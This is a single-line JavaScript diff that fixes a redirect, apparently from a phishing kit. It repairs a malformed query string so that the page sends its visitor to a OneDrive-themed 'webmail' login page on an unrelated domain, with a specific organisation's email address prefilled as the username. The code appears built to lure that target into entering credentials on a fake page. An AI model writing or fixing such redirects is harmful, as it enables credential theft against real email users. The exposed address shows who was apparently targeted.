@@ -1,1 +1,1 @@
- window.location.href = "https://onedrive7.thinoi.com/webmail/desk5.html?usernameallbrookgreen@brookgreen.org";
+ window.location.href = "https://onedrive7.thinoi.com/webmail/desk5.html?username=allbrookgreen@brookgreen.org";
